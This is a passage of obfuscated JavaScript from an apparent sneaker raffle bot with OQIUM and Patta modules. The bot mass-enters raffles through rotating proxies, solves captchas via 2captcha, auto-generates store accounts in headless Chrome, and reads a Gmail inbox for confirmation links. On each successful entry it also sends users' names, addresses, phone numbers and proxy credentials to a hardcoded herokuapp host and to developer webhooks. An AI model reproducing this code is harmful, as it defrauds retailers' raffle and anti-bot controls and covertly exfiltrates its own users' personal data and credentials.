                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x164126, _0x2bfdf0, _0x17efea) {
                    var _0x59a0a7 = _0x2bfdf0, _0x6c895b = 0x0;
                    for (var _0x128ae8 = 0x0; _0x128ae8 < _0x2bfdf0['length']; _0x128ae8++) {
                        maxTasks = _0x51f80a['threads'];
                        while (_0x6c895b >= maxTasks) {
                            await _0xf987cc(_0x51f80a['delay']);
                        }
                        async function _0x785f82(_0x3c9e4d, _0x1736c6, _0x8417d5, _0x5b6204) {
                            try {
                                await _0x3d5d40(_0x1736c6, _0x5b6204);
                            } catch (_0x44541f) {
                                throw new Error(_0x44541f);
                            }
                            async function _0x40d6f7(_0x4e9651, _0x2fd217, _0xf4d371, _0x162fcb, _0x3fdf1f) {
                                _0x6c895b++;
                                var _0x41f31d, _0x38713e = {}, _0x5d1725 = [], _0x5ecf99 = {}, _0x13895e = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x2b6eb0 = Math['round'](Math['random']() * (_0x13895e['length'] - 0x1));
                                !_0x162fcb && (_0x162fcb = {});
                                if (_0x2fd217 != 'ver') {
                                    _0x5c316f(_0xf4d371['name'] + '\x20Task\x20' + (_0x4e9651 + 0x1) + '\x20/\x20' + _0x162fcb['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd), _0x5d1725 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x5ad930
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x162fcb[_0x4e9651]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x51f80a['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x585daf
                                            }
                                        ]
                                    }], _0x5ecf99 = { 'embeds': _0x5d1725 }, _0x38713e = _0xf4d371['data'], _0x38713e['data']['attributes']['email'] = '' + _0x162fcb[_0x4e9651]['Email'];
                                    if (_0x162fcb[_0x4e9651]['Size'] == 'RANDOM') {
                                    }
                                    _0x38713e['data']['attributes']['properties']['$first_name'] = '' + _0x162fcb[_0x4e9651]['FirstName'], _0x38713e['data']['attributes']['properties']['$last_name'] = '' + _0x162fcb[_0x4e9651]['LastName'], _0x38713e['data']['attributes']['properties']['$address1'] = _0x162fcb[_0x4e9651]['Address1'] + '\x20' + _0x162fcb[_0x4e9651]['Address2'] + '\x20' + _0x162fcb[_0x4e9651]['HouseNumber'], _0x38713e['data']['attributes']['properties']['$zip'] = '' + _0x162fcb[_0x4e9651]['Zip'], _0x38713e['data']['attributes']['properties']['$city'] = '' + _0x162fcb[_0x4e9651]['City'], _0x38713e['data']['attributes']['properties']['$country'] = '' + _0x162fcb[_0x4e9651]['Country'], _0x162fcb[_0x4e9651]['Size'] == 'RANDOM' ? _0x38713e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x13895e[_0x2b6eb0] : _0x38713e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x162fcb[_0x4e9651]['Size'], _0x38713e['data']['attributes']['properties']['$phone_number'] = '' + _0x162fcb[_0x4e9651]['Phone'], _0x38713e['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x162fcb[_0x4e9651]['Follower'];
                                }
                                if (_0x51f80a['useRandomProxy'] = ![])
                                    var _0x13fdda = _0x3fdf1f[_0x4e9651]['split'](':');
                                else
                                    var _0x352468 = Math['round'](Math['random']() * (_0x3fdf1f['length'] - 0x1)), _0x13fdda = _0x3fdf1f[_0x352468]['split'](':');
                                var _0x2ee72a = {
                                    'jar': _0x4e0120,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xf4d371['url'],
                                    'headers': _0xf4d371['headers'],
                                    'body': JSON['stringify'](_0x38713e),
                                    'proxy': 'http://' + _0x13fdda[0x2] + ':' + _0x13fdda[0x3] + '@' + _0x13fdda[0x0] + ':' + _0x13fdda[0x1]
                                };
                                return _0x2fd217 != 'ver' && (_0x2ee72a['url'] = _0xf4d371['url'], _0x2ee72a['headers'] = _0xf4d371['headers']), _0x2fd217 == 'ver' && (_0x2ee72a['method'] = 'GET'), new Promise(function (_0xb3e4bf, _0x2eb47d) {
                                    callback = async (_0x11dcf6, _0x576d4f, _0x54c118) => {
                                        if (!_0x11dcf6 && _0x576d4f['statusCode'] == 0xca || !_0x11dcf6 && _0x576d4f['statusCode'] == 0xc8) {
                                            if (_0x2fd217 != 'ver') {
                                                var _0x42a28b = await _0x539676(_0x162fcb[_0x4e9651], _0xf4d371, 'dev', ![]), _0x5b7a1a = await _0x539676(_0x162fcb[_0x4e9651], _0xf4d371, 'pub', ![]);
                                                const _0x9e9087 = {
                                                    'succesDEVMSG': { 'embeds': [_0x42a28b] },
                                                    'succesPUBMSG': { 'embeds': [_0x5b7a1a] }
                                                };
                                                let _0x1ac2ee = _0x162fcb[_0x4e9651];
                                                try {
                                                    prxdata = {
                                                        'username': _0x5ad930['replace']('#', ''),
                                                        'module': _0xf4d371['name'],
                                                        'entrydata': JSON['stringify'](_0x1ac2ee),
                                                        'proxy': '' + _0x3fdf1f[_0x4e9651]
                                                    };
                                                    var _0x55385c = JSON['stringify'](prxdata);
                                                    let _0x100e44 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x55385c, _0x100e44);
                                                } catch (_0x26c75f) {
                                                }
                                                if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                                                    try {
                                                        await _0x215470(_0x51f80a['webhook'], _0x9e9087['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x9e9087['succesDEVMSG']), await _0xf987cc(0xc8);
                                                try {
                                                    await _0x215470(_0x255a14, _0x9e9087['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x46ba09(_0x162fcb[_0x4e9651], _0xf4d371);
                                            }
                                            _0x6c895b--, _0xb3e4bf(console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0xf4d371['name'] + ']\x20Task\x20' + (_0x4e9651 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2fd217 != 'ver') {
                                                var _0x177474 = '' + _0x11dcf6, _0x1b09c0 = await _0x539676(_0x162fcb[_0x4e9651], _0xf4d371, 'dev', !![], _0x177474), _0x380edb = {};
                                                _0x380edb['errorDEV'] = { 'embeds': [_0x1b09c0] }, _0x46ac44(_0x162fcb[_0x4e9651], _0xf4d371), _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x380edb['errorDEV']), await _0x215470(_0x1dec8a, _0x380edb['errorDEV']);
                                            }
                                            _0x6c895b--, _0x2eb47d(console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0xf4d371['name'] + ']\x20Task\x20' + (_0x4e9651 + 0x1) + ':\x20' + _0x11dcf6)));
                                        }
                                    };
                                    try {
                                        _0x2fd217 != 'ver' && console['log'](_0x5c3ac1() + '\x20[' + _0xf4d371['name'] + ']\x20Task\x20' + (_0x4e9651 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x38713e['data']['attributes']['email']), _0x497c42(_0x2ee72a, callback);
                                    } catch (_0xcc570e) {
                                        console['log'](_0x5c3ac1() + '\x20Task\x20' + (_0x4e9651 + 0x1) + ':\x20' + _0xcc570e);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x40d6f7(_0x5b6204, 'nor', _0x3c9e4d, _0x1736c6, _0x8417d5), console['log'](_0x5c3ac1() + '\x20[' + _0x3c9e4d['name'] + ']\x20Sleeping\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                            } catch (_0x4c3b6d) {
                            }
                        }
                        _0x785f82(_0x164126, _0x59a0a7, _0x17efea, _0x128ae8), await _0xf987cc(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2bf43a, _0x44c73b, _0x53aa13) {
                    var _0x44c73b = [], _0x2718a0 = ![];
                    async function _0x3d4dec() {
                        var _0x42d61b = new _0x2a51ab({
                            'user': _0x51f80a['masterMail'],
                            'password': _0x51f80a['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x70a43c(_0x369de1) {
                            _0x42d61b['openBox']('INBOX', ![], _0x369de1);
                        }
                        _0x42d61b['once']('ready', function () {
                            _0x70a43c(function (_0x3a6c4c, _0x554fce) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3a6c4c)
                                    throw _0x3a6c4c;
                                _0x42d61b['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x5b8b54, _0x24c273) {
                                    if (!_0x24c273 || !_0x24c273['length'])
                                        console['log'](_0x5c3ac1() + '\x20[' + _0x2bf43a['name'] + ']\x20No\x20mails\x20found'), _0x42d61b['end']();
                                    else {
                                        var _0x24d48a = _0x42d61b['seq']['fetch'](_0x24c273, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x24d48a['on']('message', function (_0x244d49, _0x44f604) {
                                            var _0x58136f = '(#' + _0x44f604 + ')\x20';
                                            _0x244d49['on']('body', function (_0x3bde80, _0x31e596) {
                                                _0xfebb(_0x3bde80, (_0x1762ca, _0x2b8b35) => {
                                                    var _0x35f8b8 = _0x2b8b35['text']['split']('(')[0x1], _0x2b624c = _0x35f8b8['split'](')')[0x0];
                                                    _0x44c73b['push'](_0x2b624c);
                                                });
                                            }), _0x244d49['once']('end', function () {
                                            });
                                        }), _0x24d48a['once']('error', function (_0xcaa88d) {
                                            console['log']('Fetch\x20error:\x20' + _0xcaa88d), _0x2718a0 = !![];
                                        }), _0x24d48a['once']('end', function () {
                                            _0x42d61b['end'](), _0x2718a0 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x42d61b['once']('error', function (_0x570cee) {
                            console['log'](_0x570cee), _0x2718a0 = !![];
                        }), _0x42d61b['once']('end', async function () {
                            _0x2718a0 = !![];
                        }), _0x42d61b['connect']();
                    }
                    async function _0x204475(_0x3caddc, _0x511844, _0xafaad9) {
                        for (var _0xceff2c = 0x0; _0xceff2c < _0x511844['length']; _0xceff2c++) {
                            async function _0x123dfb(_0x240222, _0x28169f, _0x373e66, _0x2e6a88, _0xb1fd3a) {
                                var _0x518f2b, _0x558ba4 = {}, _0x5d47ad = [], _0x516f89 = {}, _0x111d86 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x10809c = Math['round'](Math['random']() * (_0x111d86['length'] - 0x1));
                                _0x2e6a88[_0x240222]['Size'] == 'RANDOM' && (_0x2e6a88[_0x240222]['Size'] = _0x111d86[_0x10809c]);
                                !_0x2e6a88 && (_0x2e6a88 = {});
                                if (_0x51f80a['useRandomProxy'] = ![])
                                    var _0x2d071f = _0xb1fd3a[_0x240222]['split'](':');
                                else
                                    var _0x5181ed = Math['round'](Math['random']() * (_0xb1fd3a['length'] - 0x1)), _0x2d071f = _0xb1fd3a[_0x5181ed]['split'](':');
                                var _0x32c9a4 = {
                                    'jar': _0x4e0120,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x373e66['url'],
                                    'headers': _0x373e66['headers'],
                                    'body': JSON['stringify'](_0x558ba4),
                                    'proxy': 'http://' + _0x2d071f[0x2] + ':' + _0x2d071f[0x3] + '@' + _0x2d071f[0x0] + ':' + _0x2d071f[0x1]
                                };
                                return _0x28169f != 'ver' && (_0x32c9a4['url'] = _0x373e66['url'], _0x32c9a4['headers'] = _0x373e66['headers']), _0x28169f == 'ver' && (_0x32c9a4['method'] = 'GET', _0x32c9a4['url'] = _0x2e6a88[_0x240222]), new Promise(function (_0x4a29dc, _0x35017e) {
                                    callback = async (_0x436f65, _0x21d7a3, _0x42fce0) => {
                                        if (!_0x436f65 && _0x21d7a3['statusCode'] == 0xca || !_0x436f65 && _0x21d7a3['statusCode'] == 0xc8) {
                                            if (_0x28169f != 'ver') {
                                                var _0x278e5e = await _0x539676(_0x2e6a88[_0x240222], _0x373e66, 'dev', ![]), _0x233f38 = await _0x539676(_0x2e6a88[_0x240222], _0x373e66, 'pub', ![]);
                                                const _0x1ba885 = {
                                                    'succesDEVMSG': { 'embeds': [_0x278e5e] },
                                                    'succesPUBMSG': { 'embeds': [_0x233f38] }
                                                };
                                                if (_0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '')
                                                    try {
                                                        await _0x215470(_0x51f80a['webhook'], _0x1ba885['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x1ba885['succesDEVMSG']), await _0xf987cc(0xc8);
                                                try {
                                                    await _0x215470(_0x255a14, _0x1ba885['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x46ba09(_0x2e6a88[_0x240222], _0x373e66);
                                            }
                                            _0x4a29dc(console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x373e66['name'] + ']\x20Task\x20' + (_0x240222 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x28169f != 'ver') {
                                                var _0x379bad = '' + _0x436f65, _0xe64f7f = await _0x539676(_0x2e6a88[_0x240222], _0x373e66, 'dev', !![], _0x379bad), _0x36a093 = {};
                                                _0x36a093['errorDEV'] = { 'embeds': [_0xe64f7f] }, _0x46ac44(_0x2e6a88[_0x240222], _0x373e66), _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x36a093['errorDEV']), await _0x215470(_0x1dec8a, _0x36a093['errorDEV']);
                                            }
                                            _0x35017e(console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x373e66['name'] + ']\x20Task\x20' + (_0x240222 + 0x1) + ':\x20' + _0x436f65)));
                                        }
                                    };
                                    try {
                                        _0x28169f != 'ver' ? console['log'](_0x5c3ac1() + '\x20[' + _0x373e66['name'] + ']\x20Task\x20' + (_0x240222 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x558ba4['data']['attributes']['email']) : console['log'](_0x5c3ac1() + '\x20[' + _0x373e66['name'] + ']\x20Task\x20' + (_0x240222 + 0x1) + ':\x20Fetching\x20Response'), _0x497c42(_0x32c9a4, callback);
                                    } catch (_0x10e59b) {
                                        console['log'](_0x5c3ac1() + '\x20Task\x20' + (_0x240222 + 0x1) + ':\x20' + _0x10e59b);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x123dfb(_0xceff2c, 'ver', _0x3caddc, _0x511844, _0xafaad9), console['log'](_0x5c3ac1() + '\x20[' + _0x3caddc['name'] + ']\x20Sleeping\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                            } catch (_0xa79bd6) {
                            }
                        }
                    }
                    try {
                        _0x3d4dec();
                        while (!_0x2718a0) {
                            await _0xf987cc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x44c73b['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x204475(_0x2bf43a, _0x44c73b, _0x53aa13);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x49c5bd, _0x4f78b1, _0x820ee) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4efbfb = 0x0; _0x4efbfb < _0x4f78b1['length']; _0x4efbfb++) {
                        var _0x55898d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5ad930
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x51f80a['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x585daf
                                }
                            ]
                        }];
                        const _0x506ba8 = { 'embeds': _0x55898d };
                        _0x5c316f(_0x49c5bd['name'] + '\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20/\x20' + _0x4f78b1['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        try {
                            await _0x3d5d40(_0x4f78b1, _0x4efbfb);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x54a6c7 = await _0x539676(_0x4f78b1[_0x4efbfb], _0x49c5bd, 'acc', ![]);
                        const _0xc2ef05 = { 'succesDEVMSG': { 'embeds': [_0x54a6c7] } };
                        if (_0x4f78b1[_0x4efbfb]['Email'] == '' || _0x4f78b1[_0x4efbfb]['FirstName'] == '' || _0x4f78b1[_0x4efbfb]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xf987cc(0x7d0);
                            continue;
                        }
                        (_0x4f78b1[_0x4efbfb]['Password'] == '' || _0x4f78b1[_0x4efbfb] == undefined) && _0x4f78b1[_0x4efbfb]['Password'] == 'JRaffles23!';
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0xdca955 = _0x820ee[_0x4efbfb]['split'](':');
                        else
                            var _0x93e063 = Math['round'](Math['random']() * (_0x820ee['length'] - 0x1)), _0xdca955 = _0x820ee[_0x93e063]['split'](':');
                        var _0x435b25;
                        try {
                            _0x435b25 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xdca955[0x0] + ':' + _0xdca955[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x435b25 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xdca955[0x0] + ':' + _0xdca955[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x124028 = await _0x435b25['newPage']();
                            await _0x124028['authenticate']({
                                'username': '' + _0xdca955[0x2],
                                'password': '' + _0xdca955[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x49c5bd['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x124028['setRequestInterception'](!![]), _0x124028['on']('request', _0x2feabe => {
                                _0x2feabe['resourceType']() === 'image' || _0x2feabe['resourceType']() === 'font' || _0x2feabe['resourceType']() === 'media' ? _0x2feabe['abort']() : _0x2feabe['continue']();
                            }), await _0x124028['goto']('https://patta.nl/account/register'), await _0xf987cc(0xbb8), await _0x124028['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x5c3ac1() + '\x20[' + _0x49c5bd['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20Filling\x20information'), await _0x124028['type']('#RegisterForm-FirstName', '' + _0x4f78b1[_0x4efbfb]['FirstName']), await _0xf987cc(0x226), await _0x124028['type']('#RegisterForm-LastName', '' + _0x4f78b1[_0x4efbfb]['LastName']), await _0xf987cc(0x226), await _0x124028['type']('#RegisterForm-email', '' + _0x4f78b1[_0x4efbfb]['Email']), await _0xf987cc(0x226), await _0x124028['type']('#RegisterForm-password', '' + _0x4f78b1[_0x4efbfb]['Password']), await _0xf987cc(0x226), console['log'](_0x5c3ac1() + '\x20[' + _0x49c5bd['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20Submitting..'), await _0x124028['$eval']('#RegisterForm', _0x210e31 => _0x210e31['submit']()), await _0xf987cc(0x1f40);
                            try {
                                await _0x124028['waitForSelector']('.home-page-grid__collection'), await _0xf987cc(0x1f4), console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x49c5bd['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20Account\x20' + _0x4f78b1[_0x4efbfb]['Email'] + '\x20Generated!')), _0x3f8380['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x4f78b1[_0x4efbfb]['Email'] + ',' + _0x4f78b1[_0x4efbfb]['Password']), console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x49c5bd['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20Account\x20' + _0x4f78b1[_0x4efbfb]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0xc2ef05['succesDEVMSG']);
                                } catch {
                                }
                                await _0x215470(_0x53db35, _0xc2ef05['succesDEVMSG']);
                            } catch (_0x3d2a50) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3d2a50));
                            }
                        } catch (_0x4b6258) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x4efbfb + 0x1) + '\x20:\x20' + _0x4b6258));
                        } finally {
                            _0x435b25 && _0x435b25['close'](), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x40376a, _0x46f81e, _0x39e405) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x8f643b = 0x0; _0x8f643b < _0x46f81e['length']; _0x8f643b++) {
                        var _0x36c0cc;
                        if (_0x3dd974 != 'yes')
                            var _0x3dd974 = '', _0x3553ef = 0x0;
                        _0x5c316f(_0x40376a['name'] + '\x20Task\x20' + (_0x8f643b + 0x1) + '\x20/\x20' + _0x46f81e['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        try {
                            await _0x3d5d40(_0x46f81e, _0x8f643b);
                        } catch {
                            _0x3dd974 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x46f81e[_0x8f643b]['Email'] == '' || _0x46f81e[_0x8f643b]['Password'] == '' || _0x46f81e[_0x8f643b]['FirstName'] == '' || _0x46f81e[_0x8f643b]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x3d5832[taskModule]['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0xbb663a = _0x39e405[_0x8f643b]['split'](':');
                        else
                            var _0x31abc9 = Math['round'](Math['random']() * (_0x39e405['length'] - 0x1)), _0xbb663a = _0x39e405[_0x31abc9]['split'](':');
                        var _0x531d74;
                        try {
                            _0x531d74 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xbb663a[0x0] + ':' + _0xbb663a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x531d74 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xbb663a[0x0] + ':' + _0xbb663a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x243a77 = await _0x531d74['newPage']();
                            await _0x243a77['authenticate']({
                                'username': '' + _0xbb663a[0x2],
                                'password': '' + _0xbb663a[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x243a77['setRequestInterception'](!![]), _0x243a77['on']('request', _0x1013cb => {
                                _0x1013cb['resourceType']() === 'image' || _0x1013cb['resourceType']() === 'font' || _0x1013cb['resourceType']() === 'media' ? _0x1013cb['abort']() : _0x1013cb['continue']();
                            }), await _0x243a77['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x243a77['waitForSelector']('#CustomerEmail'), console['log'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x243a77['type']('#CustomerEmail', '' + _0x46f81e[_0x8f643b]['Email']), await _0xf987cc(0x12c), await _0x243a77['type']('#CustomerPassword', '' + _0x46f81e[_0x8f643b]['Password']), await _0xf987cc(0x226), await _0x243a77['$eval']('#customer_login', _0x120843 => _0x120843['submit']());
                            try {
                                await _0x243a77['waitForSelector']('#orders'), await _0xf987cc(0x4b0);
                            } catch {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x243a77['goto']('' + _0x46f81e[_0x8f643b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xf987cc(0xbb8), console['log'](_0x5c3ac1() + '\x20[' + _0x40376a['name'] + ']\x20Task\x20' + (_0x8f643b + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x243a77['waitForSelector']('#email');
                            } catch {
